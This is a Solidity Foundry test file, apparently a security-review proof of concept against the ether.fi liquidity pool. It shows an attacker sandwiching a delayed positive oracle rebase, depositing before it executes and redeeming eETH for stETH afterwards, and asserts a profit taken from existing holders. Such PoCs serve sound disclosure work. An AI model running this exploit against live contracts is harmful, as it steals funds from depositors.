// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Tested after copying this artifact into test/ on the clean reviewed
// origin/master snapshot. The import is intentionally relative to test/.

import "./TestSetup.sol";

contract OraclePositiveRebaseMaxImpactPoC is TestSetup {
    address internal incumbent = makeAddr("incumbent");
    address internal stEthFunder = makeAddr("stEthFunder");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        setUpTests();

        // Approximate the deployed TVL observed on 31 July 2026.
        vm.deal(incumbent, 1_974_285 ether);
        vm.prank(incumbent);
        liquidityPoolInstance.deposit{value: 1_974_285 ether}();

        // Give the protocol the currently redeemable 5,000 stETH inventory.
        TestERC20 mockStEth = new TestERC20("Mock stETH", "mstETH");
        vm.etch(address(stEth), address(mockStEth).code);
        TestERC20(address(stEth)).mint(address(etherFiRestakerInstance), 5_000 ether);

        vm.prank(address(etherFiAdminInstance));
        liquidityPoolInstance.depositToRecipient(stEthFunder, 5_000 ether, address(0));

        // Deployed stETH redemption parameters: 10 bps fee, no watermark,
        // and a 5,000-token bucket.
        vm.startPrank(owner);
        etherFiRedemptionManagerInstance.setExitFeeBasisPoints(10, address(stEth));
        etherFiRedemptionManagerInstance.setLowWatermarkInBpsOfTvl(0, address(stEth));
        etherFiRedemptionManagerInstance.setCapacity(5_000 ether, address(stEth));
        etherFiRedemptionManagerInstance.setRefillRatePerSecond(5_000 ether, address(stEth));
        vm.stopPrank();

        vm.mockCall(
            stEthChainlinkFeed,
            abi.encodeWithSignature("latestRoundData()"),
            abi.encode(uint80(0), int256(1 ether), uint256(0), block.timestamp, uint80(0))
        );
    }

    function test_maxImpactAfterDelayedPositiveReport() public {
        uint256 tvlBefore = liquidityPoolInstance.getTotalPooledEther();
        assertEq(tvlBefore, 1_979_285 ether);

        // A report delayed for >18.25 days may legitimately reach the hard
        // 25-bps positive-rebase cap while remaining below the deployed 5% APR limit.
        _moveClock(int256(19 days / 12));

        IEtherFiOracle.OracleReport memory report = _emptyOracleReport();
        report.accruedRewards = int128(int256(tvlBefore * 25 / 10_000));
        _publishForExecution(report);
        assertTrue(etherFiAdminInstance.canExecuteTasks(report));

        // Chosen so the rebased balance stays just below the 5,000 stETH bucket.
        uint256 capital = 4_987 ether;
        vm.deal(attacker, capital);

        vm.startPrank(attacker);
        liquidityPoolInstance.deposit{value: capital}();
        etherFiAdminInstance.executeTasks(report);

        uint256 rebasedBalance = eETHInstance.balanceOf(attacker);
        assertGt(rebasedBalance, capital);
        assertLe(rebasedBalance, 5_000 ether);

        vm.mockCall(
            stEthChainlinkFeed,
            abi.encodeWithSignature("latestRoundData()"),
            abi.encode(uint80(0), int256(1 ether), uint256(0), block.timestamp, uint80(0))
        );

        eETHInstance.approve(address(etherFiRedemptionManagerInstance), rebasedBalance);
        uint256 beforeBalance = stEth.balanceOf(attacker);
        etherFiRedemptionManagerInstance.redeemEEth(rebasedBalance, attacker, address(stEth));
        uint256 received = stEth.balanceOf(attacker) - beforeBalance;
        vm.stopPrank();

        uint256 profit = received - capital;
        emit log_named_decimal_uint("attacker profit (stETH)", profit, 18);

        // Direct extraction from pre-existing eETH holders, after paying the
        // deployed 10-bps exit fee. At current TVL/capacity the bound is ~7.4 stETH.
        assertGt(profit, 7.4 ether);
    }

    function _publishForExecution(IEtherFiOracle.OracleReport memory report) internal {
        _initReportBlockStamp(report);

        uint32 currentSlot = etherFiOracleInstance.computeSlotAtTimestamp(block.timestamp);
        uint32 currentEpoch = currentSlot / 32;
        uint32 reportEpoch = report.refSlotTo / 32 + 3;
        if (currentEpoch < reportEpoch) {
            _moveClock(int256(uint256(32 * (reportEpoch - currentEpoch))));
        }

        vm.prank(alice);
        etherFiOracleInstance.submitReport(report);
        vm.prank(bob);
        etherFiOracleInstance.submitReport(report);
    }
}
